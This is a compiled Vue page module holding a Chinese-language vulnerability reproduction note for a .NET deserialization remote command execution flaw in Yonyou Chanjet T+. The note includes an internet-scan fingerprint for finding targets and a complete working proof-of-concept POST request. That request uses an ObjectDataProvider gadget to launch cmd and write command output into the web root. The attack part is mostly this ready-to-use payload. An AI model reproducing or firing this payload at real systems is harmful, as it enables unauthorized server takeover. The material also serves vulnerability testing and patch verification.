import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{o as i,c as t,e as a}from"./app-58e4a7d6.js";const n={},s=a(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>用友 畅捷通T+ GetStoreWarehouseByStore 存在 .net反序列化漏洞，导致远程命令执行，控制服务器</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><p>用友 畅捷通T+</p><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>app=&quot;畅捷通-TPlus&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>登录页面</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230704111641427.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>验证POC</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /tplus/ajaxpro/Ufida.T.CodeBehind._PriorityLevel,App_Code.ashx?method=GetStoreWarehouseByStore HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/4E423F
Connection: close
Content-Length: 668
X-Ajaxpro-Method: GetStoreWarehouseByStore
Accept-Encoding: gzip

{
  &quot;storeID&quot;:{
    &quot;__type&quot;:&quot;System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35&quot;,
    &quot;MethodName&quot;:&quot;Start&quot;,
    &quot;ObjectInstance&quot;:{
      &quot;__type&quot;:&quot;System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089&quot;,
      &quot;StartInfo&quot;:{
        &quot;__type&quot;:&quot;System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089&quot;,
        &quot;FileName&quot;:&quot;cmd&quot;,
        &quot;Arguments&quot;:&quot;/c whoami &gt; C:/Progra~2/Chanjet/TPlusStd/WebSite/2RUsL6jgx9sGX4GItQBcVfxarBM.txt&quot;
      }
    }
  }
}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230704111653392.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>/tplus/xxx.txt
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230704111706616.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,14),r=[s];function o(d,l){return i(),t("div",null,r)}const v=e(n,[["render",o],["__file","用友 畅捷通T_ GetStoreWarehouseByStore 远程命令执行漏洞.html.vue"]]);export{v as default};
